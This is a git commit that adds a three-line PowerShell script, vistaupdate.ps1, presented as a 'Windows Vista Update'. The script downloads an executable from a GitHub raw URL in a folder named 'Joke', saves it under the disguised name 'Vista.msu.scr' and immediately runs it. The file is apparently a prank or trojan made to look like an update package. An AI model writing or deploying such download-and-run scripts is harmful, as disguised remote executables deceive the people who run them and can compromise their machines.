83926263a1678211caa4cbf638a6887142022380
dartzfork <dartzcvm@proton.me>
2025-04-04 23:27:07 +0200

    Create vistaupdate.ps1

---
+++ vistaupdate.ps1
@@ -0,0 +1,3 @@
+echo Downloading Windows Vista Update...
+irm -uri "https://github.com/someonefromdiscord/cvm/raw/refs/heads/master/Joke/Vista.exe" -outfile "Vista.msu.scr"
+Start-Process Vista.msu.scr
